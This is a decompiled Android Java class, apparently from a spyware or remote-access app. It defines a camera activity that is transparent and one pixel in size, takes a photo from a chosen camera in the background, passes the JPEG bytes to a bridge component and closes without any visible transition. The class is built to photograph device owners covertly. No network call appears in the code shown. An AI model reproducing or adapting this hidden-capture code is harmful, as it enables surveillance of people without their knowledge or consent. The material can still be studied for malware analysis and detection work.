package com.servers.ozzbzk;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.Window;

/* loaded from: classes.dex */
public class CameraProxyActivity extends Activity {
    private static final String TAG = "CameraProxy";

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        Window window = getWindow();
        window.addFlags(568);
        if (Build.VERSION.SDK_INT >= 28) {
            window.getAttributes().layoutInDisplayCutoutMode = 1;
        }
        window.setStatusBarColor(0);
        window.setNavigationBarColor(0);
        View view = new View(this);
        view.setBackgroundColor(0);
        setContentView(view);
        window.setLayout(1, 1);
        window.getDecorView().setAlpha(0.0f);
        final int intExtra = getIntent().getIntExtra("camera_id", 0);
        final int intExtra2 = getIntent().getIntExtra("quality", 85);
        Log.i(TAG, "started camId=" + intExtra);
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: com.servers.ozzbzk.CameraProxyActivity.1
            @Override // java.lang.Runnable
            public void run() {
                CameraProxyActivity.this.doCapture(intExtra, intExtra2);
            }
        }, 300L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void doCapture(final int i, int i2) {
        Scheduler.submitIo(new Runnable() { // from class: com.servers.ozzbzk.CameraProxyActivity.2
            @Override // java.lang.Runnable
            public void run() {
                CameraProxyActivity cameraProxyActivity;
                Runnable runnable;
                try {
                    byte[] captureOnce = new CameraCaptureHelper(CameraProxyActivity.this).captureOnce(i);
                    if (captureOnce == null || captureOnce.length <= 0) {
                        Log.w(CameraProxyActivity.TAG, "capture failed");
                        CameraProxyActivity.storeError("capture_failed");
                    } else {
                        Log.i(CameraProxyActivity.TAG, "captured " + captureOnce.length + " bytes");
                        Bundle bundle = new Bundle();
                        bundle.putBoolean("success", true);
                        bundle.putBoolean("has_result", true);
                        bundle.putByteArray("jpeg", captureOnce);
                        bundle.putInt("size", captureOnce.length);
                        bundle.putLong("captured_at", System.currentTimeMillis());
                        BridgeProvider.setCameraResult(bundle);
                    }
                    cameraProxyActivity = CameraProxyActivity.this;
                    runnable = new Runnable() { // from class: com.servers.ozzbzk.CameraProxyActivity.2.1
                        @Override // java.lang.Runnable
                        public void run() {
                            CameraProxyActivity.this.overridePendingTransition(0, 0);
                            CameraProxyActivity.this.finish();
                        }
                    };
                } catch (Throwable th) {
                    try {
                        Log.e(CameraProxyActivity.TAG, "error: " + th.getMessage());
                        CameraProxyActivity.storeError(th.getMessage() != null ? th.getMessage() : "unknown");
                        cameraProxyActivity = CameraProxyActivity.this;
                        runnable = new Runnable() { // from class: com.servers.ozzbzk.CameraProxyActivity.2.1
                            @Override // java.lang.Runnable
                            public void run() {
                                CameraProxyActivity.this.overridePendingTransition(0, 0);
                                CameraProxyActivity.this.finish();
                            }
                        };
                    } catch (Throwable th2) {
                        CameraProxyActivity.this.runOnUiThread(new Runnable() { // from class: com.servers.ozzbzk.CameraProxyActivity.2.1
                            @Override // java.lang.Runnable
                            public void run() {
                                CameraProxyActivity.this.overridePendingTransition(0, 0);
                                CameraProxyActivity.this.finish();
                            }
                        });
                        throw th2;
                    }
                }
                cameraProxyActivity.runOnUiThread(runnable);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void storeError(String str) {
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", false);
        bundle.putBoolean("has_result", true);
        if (str == null) {
            str = "unknown";
        }
        bundle.putString("error", str);
        bundle.putLong("captured_at", System.currentTimeMillis());
        BridgeProvider.setCameraResult(bundle);
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        finish();
    }
}
